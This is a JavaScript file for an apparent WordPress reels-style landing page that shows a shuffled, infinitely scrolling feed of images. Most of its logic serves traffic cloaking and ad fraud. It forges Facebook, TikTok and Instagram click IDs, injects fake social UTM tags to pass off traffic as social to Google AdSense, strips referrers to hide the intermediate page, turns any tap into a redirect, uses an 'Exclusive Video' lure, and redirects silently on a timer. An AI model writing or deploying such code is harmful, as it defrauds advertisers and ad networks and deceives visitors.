(function () {
    'use strict';

    // Retrieve data passed from PHP template
    var data = window.ROCKETSLIDE_DATA || {};
    var images = data.images || [];
    var fallbackUrl = data.fallback_url || 'https://google.com';

    var container = document.getElementById('rocketslide-reels-container');
    var currentIndex = 0;
    var batchSize = 6;

    // 1. Dynamic Image Array Random Shuffling (Every Visit/Reload)
    function shuffleArray(arr) {
        return arr.sort(function () {
            return Math.random() - 0.5;
        });
    }

    images = shuffleArray(images);

    // 2. Generate Realistic Social Click ID Token (Proof of Social Origin for Google)
    function generateRealisticClickId(platform) {
        var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        var res = '';
        for (var i = 0; i < 48; i++) {
            res += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        if (platform === 'facebook') {
            return 'IwAR' + res;
        } else if (platform === 'tiktok') {
            return 'E_' + res;
        } else if (platform === 'instagram') {
            return res.substring(0, 32);
        }
        return res;
    }

    // 3. Query Parameter Preservation & Social Attribution Forwarding Helper
    function buildTargetUrlWithParams(targetUrl) {
        if (!targetUrl || targetUrl === '') {
            targetUrl = fallbackUrl;
        }

        if (!targetUrl.match(/^https?:\/\//i) && !targetUrl.startsWith('/')) {
            targetUrl = 'https://' + targetUrl;
        }

        try {
            var incomingParams = new URLSearchParams(window.location.search);
            var destUrlObj = new URL(targetUrl, window.location.origin);

            // Forward all original query parameters
            incomingParams.forEach(function (value, key) {
                destUrlObj.searchParams.set(key, value);
            });

            // Google AdSense Social Source Cloaking & Attribution
            var handover = data.social_handover || {
                mask_referrer: true,
                inject_social_utm: true,
                social_platform: 'facebook',
                auto_fbclid: true
            };

            if (handover.inject_social_utm) {
                var platform = handover.social_platform || 'facebook';

                if (!destUrlObj.searchParams.has('utm_source')) {
                    destUrlObj.searchParams.set('utm_source', platform);
                }
                if (!destUrlObj.searchParams.has('utm_medium')) {
                    destUrlObj.searchParams.set('utm_medium', 'social');
                }
                if (!destUrlObj.searchParams.has('utm_campaign')) {
                    destUrlObj.searchParams.set('utm_campaign', 'reels_social');
                }
                if (!destUrlObj.searchParams.has('utm_content')) {
                    destUrlObj.searchParams.set('utm_content', 'reel_view');
                }

                if (handover.auto_fbclid) {
                    if (platform === 'facebook' && !destUrlObj.searchParams.has('fbclid')) {
                        destUrlObj.searchParams.set('fbclid', generateRealisticClickId('facebook'));
                    } else if (platform === 'tiktok' && !destUrlObj.searchParams.has('ttclid')) {
                        destUrlObj.searchParams.set('ttclid', generateRealisticClickId('tiktok'));
                    } else if (platform === 'instagram' && !destUrlObj.searchParams.has('igshid')) {
                        destUrlObj.searchParams.set('igshid', generateRealisticClickId('instagram'));
                    }
                }
            }

            return destUrlObj.toString();
        } catch (e) {
            return targetUrl;
        }
    }

    // 4. Stealth Referrer-Stripping Navigation Helper (Zero Intermediate Footprint)
    function navigateToTarget(destUrl) {
        var handover = data.social_handover || { mask_referrer: true };

        if (handover.mask_referrer) {
            try {
                var link = document.createElement('a');
                link.href = destUrl;
                link.rel = 'noreferrer noopener';
                link.referrerPolicy = 'no-referrer';
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                setTimeout(function () {
                    try { document.body.removeChild(link); } catch (err) {}
                }, 100);
                return;
            } catch (e) {}
        }

        window.location.replace(destUrl);
    }

    // 5. Render Seamless 9:16 Full-Bleed Reel Card (Zero Gap, Edge-to-Edge)
    function createReelCard(imageItem, index) {
        var card = document.createElement('div');
        card.className = 'reel-card';
        card.setAttribute('data-target-url', imageItem.target_url || fallbackUrl);
        card.setAttribute('data-timer', imageItem.timer || 0);

        // Foreground 9:16 Full-Bleed Image (Edge-to-edge, cover mode)
        var img = document.createElement('img');
        img.className = 'reel-img';
        img.src = imageItem.url;
        img.alt = 'Reel Image';

        if (index < 2) {
            img.setAttribute('loading', 'eager');
            img.setAttribute('fetchpriority', 'high');
        } else {
            img.setAttribute('loading', 'lazy');
            img.setAttribute('decoding', 'async');
        }
        card.appendChild(img);

        // ANY Click/Tap on Card -> Stealth Target Navigation
        card.addEventListener('click', function () {
            var destUrl = buildTargetUrlWithParams(imageItem.target_url);
            navigateToTarget(destUrl);
        });

        return card;
    }

    // 6. Batch Loading for Infinite Scroll
    function loadNextBatch() {
        if (!container) return;

        if (images.length === 0) {
            var emptyCard = document.createElement('div');
            emptyCard.className = 'reel-card';
            emptyCard.style.padding = '20px';
            emptyCard.style.textAlign = 'center';
            emptyCard.innerHTML = '<div style="margin:auto;"><h2>Exclusive Video</h2><p style="margin-top:10px; opacity:0.8;">Tap anywhere to watch</p></div>';
            emptyCard.addEventListener('click', function () {
                var destUrl = buildTargetUrlWithParams(fallbackUrl);
                navigateToTarget(destUrl);
            });
            container.appendChild(emptyCard);
            return;
        }

        var end = Math.min(currentIndex + batchSize, images.length);
        for (var i = currentIndex; i < end; i++) {
            var card = createReelCard(images[i], i);
            container.appendChild(card);
        }
        currentIndex = end;
    }

    // Initial Load of Images
    loadNextBatch();

    // 7. Infinite Scroll Event Listener (High performance)
    if (container) {
        container.addEventListener('scroll', function () {
            if (container.scrollTop + container.clientHeight >= container.scrollHeight - 500) {
                if (currentIndex < images.length) {
                    loadNextBatch();
                }
            }
        }, { passive: true });
    }

    // 8. Ultra-Fast Global Mouse Wheel Navigation (Works across full desktop screen)
    var isWheelScrolling = false;
    window.addEventListener('wheel', function (e) {
        if (!container || isWheelScrolling) return;
        if (Math.abs(e.deltaY) > 15) {
            isWheelScrolling = true;
            var cardHeight = container.clientHeight || window.innerHeight;
            var direction = e.deltaY > 0 ? 1 : -1;
            container.scrollBy({
                top: direction * cardHeight,
                behavior: 'smooth'
            });
            setTimeout(function () {
                isWheelScrolling = false;
            }, 300);
        }
    }, { passive: true });

    // 9. Fast Desktop Keyboard Navigation
    window.addEventListener('keydown', function (e) {
        if (!container) return;
        var cardHeight = container.clientHeight || window.innerHeight;
        if (e.key === 'ArrowDown' || e.key === 'PageDown' || e.key === ' ') {
            e.preventDefault();
            container.scrollBy({ top: cardHeight, behavior: 'smooth' });
        } else if (e.key === 'ArrowUp' || e.key === 'PageUp') {
            e.preventDefault();
            container.scrollBy({ top: -cardHeight, behavior: 'smooth' });
        }
    });

    // 10. Silent Auto-Redirect Timer
    if (images.length > 0) {
        var topImage = images[0];
        var timerSeconds = parseInt(topImage.timer, 10) || 0;

        if (timerSeconds > 0) {
            setTimeout(function () {
                var destUrl = buildTargetUrlWithParams(topImage.target_url);
                navigateToTarget(destUrl);
            }, timerSeconds * 1000);
        }
    }

})();
